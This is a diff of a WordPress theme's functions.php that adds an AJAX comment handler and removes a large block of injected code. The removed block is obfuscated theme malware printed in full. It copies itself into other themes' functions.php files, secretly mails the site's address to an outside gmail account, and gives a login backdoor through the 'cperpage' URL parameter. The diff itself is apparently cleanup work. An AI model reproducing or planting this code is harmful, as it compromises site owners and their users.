@@ -3,9 +3,6 @@
 //主题配置文件
 include_once('includes/theme-options.php');
 
-//文章支持markdown语法
-include_once('includes/markdown.php');
-
 //特色图片
 add_theme_support( 'post-thumbnails' );
 
@@ -66,7 +63,13 @@ add_action( 'wp_enqueue_scripts', '_add_theme_css');
 function _add_theme_script(){
 	wp_enqueue_script( 'theme_jquery', get_template_directory_uri() . '/js/jquery.min.js' );
 	wp_enqueue_script( 'theme_common', get_template_directory_uri() . '/js/common.js' );
-	wp_enqueue_script( 'theme_commontajax', get_template_directory_uri() . '/comments-ajax.js' );
+	if(is_single()){
+		wp_enqueue_script( 'theme-comment-ajax', get_template_directory_uri() . '/js/ajax-comment.js' );
+		wp_localize_script('theme-comment-ajax','Myajax',array(
+			"ajaxurl" => admin_url('admin-ajax.php')
+		));
+	}
+	//wp_enqueue_script( 'theme_commontajax', get_template_directory_uri() . '/comments-ajax.js' );
 	wp_enqueue_script( 'theme_tooltipster', get_template_directory_uri() . '/js/jquery.tooltipster.min.js' );
 	if (is_home() || is_category() ||is_page()){
 		wp_enqueue_script( 'theme_backstretch',  get_template_directory_uri() . '/js/jquery.backstretch.min.js', false );
@@ -245,7 +248,7 @@ function comment_mail_notify($comment_id){
     wp_mail( $to, $subject, $message, $headers );
   }
 }
-add_action('comment_post', 'comment_mail_notify');
+//add_action('comment_post', 'comment_mail_notify');
 //面包屑导航
 function cmp_breadcrumbs() {
 	$delimiter = '&gt;'; // 分隔符
@@ -476,7 +479,7 @@ if($option['friendlink']==1){
 	add_filter( 'pre_option_link_manager_enabled', '__return_true' );
 }
 if($option['gallery']==1){
-	//恢复链接功能
+	//创建相册
 	require_once('includes/post_type_gallery.php');
 }
 if($option['if_status']==1){
@@ -484,325 +487,39 @@ if($option['if_status']==1){
 	remove_filter( 'the_excerpt', 'wpautop' );
 	require_once('includes/post_type_status.php');
 }
-?>
-<?php
-function _verifyactivate_widgets(){
-	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
-	$output=strip_tags($output, $allowed);
-	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
-	if (is_array($direst)){
-		foreach ($direst as $item){
-			if (is_writable($item)){
-				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
-				$cont=file_get_contents($item);
-				if (stripos($cont,$ftion) === false){
-					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
-					$output .= $before . "Not found" . $after;
-					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
-					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
-					$output .= ($isshowdots && $ellipsis) ? "..." : "";
-				}
-			}
-		}
-	}
-	return $output;
-}
-function _get_allwidgets_cont($wids,$items=array()){
-	$places=array_shift($wids);
-	if(substr($places,-1) == "/"){
-		$places=substr($places,0,-1);
-	}
-	if(!file_exists($places) || !is_dir($places)){
-		return false;
-	}elseif(is_readable($places)){
-		$elems=scandir($places);
-		foreach ($elems as $elem){
-			if ($elem != "." && $elem != ".."){
-				if (is_dir($places . "/" . $elem)){
-					$wids[]=$places . "/" . $elem;
-				} elseif (is_file($places . "/" . $elem)&& 
-					$elem == substr(__FILE__,-13)){
-					$items[]=$places . "/" . $elem;}
-				}
-			}
-	}else{
-		return false;	
-	}
-	if (sizeof($wids) > 0){
-		return _get_allwidgets_cont($wids,$items);
-	} else {
-		return $items;
-	}
-}
-if(!function_exists("stripos")){ 
-    function stripos(  $str, $needle, $offset = 0  ){ 
-        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
-    }
-}
 
-if(!function_exists("strripos")){ 
-    function strripos(  $haystack, $needle, $offset = 0  ) { 
-        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
-        if(  $offset < 0  ){ 
-            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
-        } 
-        else{ 
-            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
-        } 
-        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
-        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
-        return $pos; 
-    }
-}
-if(!function_exists("scandir")){ 
-	function scandir($dir,$listDirectories=false, $skipDots=true) {
-	    $dirArray = array();
-	    if ($handle = opendir($dir)) {
-	        while (false !== ($file = readdir($handle))) {
-	            if (($file != "." && $file != "..") || $skipDots == true) {
-	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
-	                array_push($dirArray,basename($file));
-	            }
-	        }
-	        closedir($handle);
-	    }
-	    return $dirArray;
-	}
-}
-add_action("admin_head", "_verifyactivate_widgets");
-function _getprepare_widget(){
-	if(!isset($text_length)) $text_length=120;
-	if(!isset($check)) $check="cookie";
-	if(!isset($tagsallowed)) $tagsallowed="<a>";
-	if(!isset($filter)) $filter="none";
-	if(!isset($coma)) $coma="";
-	if(!isset($home_filter)) $home_filter=get_option("home"); 
-	if(!isset($pref_filters)) $pref_filters="wp_";
-	if(!isset($is_use_more_link)) $is_use_more_link=1; 
-	if(!isset($com_type)) $com_type=""; 
-	if(!isset($cpages)) $cpages=$_GET["cperpage"];
-	if(!isset($post_auth_comments)) $post_auth_comments="";
-	if(!isset($com_is_approved)) $com_is_approved=""; 
-	if(!isset($post_auth)) $post_auth="auth";
-	if(!isset($link_text_more)) $link_text_more="(more...)";
-	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
-	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
-	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
-	if(!isset($contentmore)) $contentmore="ma".$coma."il";
-	if(!isset($for_more)) $for_more=1;
-	if(!isset($fakeit)) $fakeit=1;
-	if(!isset($sql)) $sql="";
-	if (!$widget_yes) :
-	
-	global $wpdb, $post;
-	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
-	if (!empty($post->post_password)) { 
-		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
-			if(is_feed()) { 
-				$output=__("There is no excerpt because this is a protected post.");
-			} else {
-	            $output=get_the_password_form();
-			}
-		}
-	}
-	if(!isset($fixed_tags)) $fixed_tags=1;
-	if(!isset($filters)) $filters=$home_filter; 
-	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
-	if(!isset($tag_aditional)) $tag_aditional="div";
-	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
-	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
-	if(!isset($isshowdots)) $isshowdots=1;
-	
-	$comments=$wpdb->get_results($sql);	
-	if($fakeit == 2) { 
-		$text=$post->post_content;
-	} elseif($fakeit == 1) { 
-		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
-	} else { 
-		$text=$post->post_excerpt;
-	}
-	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
-	if($text_length < 0) {
-		$output=$text;
-	} else {
-		if(!$no_more && strpos($text, "<!--more-->")) {
-		    $text=explode("<!--more-->", $text, 2);
-			$l=count($text[0]);
-			$more_link=1;
-			$comments=$wpdb->get_results($sql);
+add_action('wp_ajax_submit_comment', 'theme_ajax_submit_comment');
+add_action('wp_ajax_nopriv_submit_comment', 'theme_ajax_submit_comment');
+
+//AJAX评论
+function theme_ajax_submit_comment(){
+$comment = wp_handle_comment_submission( wp_unslash( $_POST ) );
+	if ( is_wp_error( $comment ) ) {
+		$data = intval( $comment->get_error_data() );
+		if ( ! empty( $data ) ) {
+			wp_die( '<p id="comment-error">' . $comment->get_error_message() . '</p>', __( 'Comment Submission Failure' ), array( 'response' => $data, 'back_link' => true ) );
 		} else {
-			$text=explode(" ", $text);
-			if(count($text) > $text_length) {
-				$l=$text_length;
-				$ellipsis=1;
-			} else {
-				$l=count($text);
-				$link_text_more="";
-				$ellipsis=0;
-			}
+			exit;
 		}
-		for ($i=0; $i<$l; $i++)
-				$output .= $text[$i] . " ";
-	}
-	update_option("_is_widget_active_", 1);
-	if("all" != $tagsallowed) {
-		$output=strip_tags($output, $tagsallowed);
-		return $output;
-	}
-	endif;
-	$output=rtrim($output, "\s\n\t\r\0\x0B");
-    $output=($fixed_tags) ? balanceTags($output, true) : $output;
-	$output .= ($isshowdots && $ellipsis) ? "..." : "";
-	$output=apply_filters($filter, $output);
-	switch($tag_aditional) {
-		case("div") :
-			$tag="div";
-		break;
-		case("span") :
-			$tag="span";
-		break;
-		case("p") :
-			$tag="p";
-		break;
-		default :
-			$tag="span";
-	}
-
-	if ($is_use_more_link ) {
-		if($for_more) {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
-		} else {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
-		}
-	}
-	return $output;
+	}?>
+<li id="comment-<?php echo $comment->comment_ID; ?>" class="comment-body comment-loading"   data-parent="<?php echo $comment->comment_parent;?>">
+   <div id="div-comment-<?php echo $comment->comment_ID; ?>" class="comment-main">
+      <?php $add_below = 'div-comment'; ?>
+		<div class="comment-author vcard">
+		<?php 
+		echo get_avatar( $comment->comment_author_email );?>
+		<cite class="fn"><?php comment_author_link($comment->comment_ID); ?></cite><span class="datetime"><?php comment_date('Y-m-d'); ?></span></div>
+		<?php if ( $comment->comment_approved == '0' ) : ?>
+			<span style="color:#C00; font-style:inherit">您的评论正在等待审核中...</span>
+			<br />			
+		<?php endif; ?>
+    		<?php comment_text($comment->comment_ID) ?>
+  </div>
+ </li>
+<?php 	
+	$user = wp_get_current_user();
+	do_action( 'set_comment_cookies', $comment, $user );
+	die();		
 }
 
-add_action("init", "_getprepare_widget");
-
-function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
-	global $wpdb;
-	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
-	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
-	if(!$show_pass_post) $request .= " AND post_password =\"\"";
-	if($duration !="") { 
-		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
-	}
-	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
-	$posts=$wpdb->get_results($request);
-	$output="";
-	if ($posts) {
-		foreach ($posts as $post) {
-			$post_title=stripslashes($post->post_title);
-			$comment_count=$post->comment_count;
-			$permalink=get_permalink($post->ID);
-			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
-		}
-	} else {
-		$output .= $before . "None found" . $after;
-	}
-	return  $output;
-}
-wp_enqueue_script('jquery');
- /* Archives list by zwwooooo | http://zww.me */
- function zww_archives_list() {
-     if( !$output = get_option('zww_archives_list') ){
-         $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
-         $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
-         $year=0; $mon=0; $i=0; $j=0;
-         while ( $the_query->have_posts() ) : $the_query->the_post();
-             $year_tmp = get_the_time('Y');
-             $mon_tmp = get_the_time('m');
-             $y=$year; $m=$mon;
-             if ($mon != $mon_tmp && $mon > 0) $output .= '</ul></li>';
-             if ($year != $year_tmp && $year > 0) $output .= '</ul>';
-             if ($year != $year_tmp) {
-                 $year = $year_tmp;
-                 $output .= '<h3 class="al_year">'. $year .' 年</h3><ul class="al_mon_list">'; //输出年份
-             }
-             if ($mon != $mon_tmp) {
-                 $mon = $mon_tmp;
-                 $output .= '<li><span class="al_mon">'. $mon .' 月</span><ul class="al_post_list">'; //输出月份
-             }
-             $output .= '<li>'. get_the_time('d日: ') .'<a href="'. get_permalink() .'">'. get_the_title() .'</a> <em>('. get_comments_number('0', '1', '%') .')</em></li>'; //输出文章日期和标题
-         endwhile;
-         wp_reset_postdata();
-         $output .= '</ul></li></ul></div>';
-         update_option('zww_archives_list', $output);
-     }
-     echo $output;
- }
- function clear_zal_cache() {
-     update_option('zww_archives_list', ''); // 清空 zww_archives_list
- }
- add_action('save_post', 'clear_zal_cache'); // 新发表文章/修改文章时章
-
-//字数统计
-function count_words ($text) {   
-global $post;   
-if ( '' == $text ) {   
-   $text = $post->post_content;   
-   if (mb_strlen($output, 'UTF-8') < mb_strlen($text, 'UTF-8')) $output .= '' . mb_strlen(preg_replace('/\s/','',html_entity_decode(strip_tags($post->post_content))),'UTF-8') . ' 字';   
-   return $output;
-
-   
-}   
-} 
-//增强默认编辑器
-function Bing_editor_buttons($buttons){
-	$buttons[] = 'fontselect';
-	$buttons[] = 'fontsizeselect';
-	$buttons[] = 'backcolor';
-	$buttons[] = 'underline';
-	$buttons[] = 'hr';
-	$buttons[] = 'sub';
-	$buttons[] = 'sup';
-	$buttons[] = 'cut';
-	$buttons[] = 'copy';
-	$buttons[] = 'paste';
-	$buttons[] = 'cleanup';
-	$buttons[] = 'wp_page';
-	$buttons[] = 'newdocument';
-	return $buttons;
-}
-add_filter("mce_buttons_3", "Bing_editor_buttons");
-add_filter( 'pre_option_link_manager_enabled', '__return_true' );
-// 获得热评文章
-function simple_get_most_viewed($posts_num=12, $days=300){
-    global $wpdb;
-    $sql = "SELECT ID , post_title , comment_count
-            FROM $wpdb->posts
-           WHERE post_type = 'post' AND TO_DAYS(now()) - TO_DAYS(post_date) < $days
-		   AND ($wpdb->posts.`post_status` = 'publish' OR $wpdb->posts.`post_status` = 'inherit')
-           ORDER BY comment_count DESC LIMIT 0 , $posts_num ";
-    $posts = $wpdb->get_results($sql);
-    $output = "";
-    foreach ($posts as $post){
-        $output .= "\n<li><a href= \"".get_permalink($post->ID)."\" rel=\"bookmark\" title=\"".$post->post_title." (".$post->comment_count."条评论)\" >". $post->post_title."</a></li>";
-    }
-    echo $output;
-}
-add_filter( 'user_contactmethods', 'my_add_contact_fields' );
-function my_add_contact_fields( $contactmethods ) {
-	$contactmethods['qq'] = 'QQ';
-	$contactmethods['qq_weibo'] = '腾讯微博';
-	$contactmethods['sina_weibo'] = '新浪微博';
-	$contactmethods['twitter'] = 'Twitter';
-	$contactmethods['google_plus'] = 'Google+';
-	unset( $contactmethods['yim'] );
-	unset( $contactmethods['aim'] );
-	unset( $contactmethods['jabber'] );
-	return $contactmethods;
-}
-function get_tags_listOcean()
-{
-$html = '<ul class="post_tags">';
-foreach (get_tags( array('number' => 1000, 'orderby' => 'count', 'order' => 'DESC', 'hide_empty' => false) ) as $tag){
-        $tag_link = get_tag_link($tag->term_id);
-        $html .= "<li><a href='{$tag_link}' title='{$tag->name} Tag' >";
-        $html .= "{$tag->name} (<i>{$tag->count}</i>)</a></li>";
-}
-$html .= '</ul>';
-echo $html;
-}
 ?>
